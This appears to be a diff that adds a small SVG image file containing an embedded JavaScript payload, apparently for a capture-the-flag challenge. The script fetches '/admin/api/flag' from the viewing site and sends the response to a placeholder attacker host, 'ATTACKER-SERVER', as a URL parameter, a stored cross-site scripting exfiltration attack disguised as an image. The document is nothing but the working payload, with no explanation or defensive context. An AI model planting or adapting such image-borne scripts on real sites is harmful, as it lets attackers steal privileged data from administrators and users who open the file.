@@ -1,0 +1,7 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    fetch('/admin/api/flag')
+      .then(r => r.text())
+      .then(flag => fetch('https://ATTACKER-SERVER/?f='+encodeURIComponent(flag)));
+  </script>
+</svg>
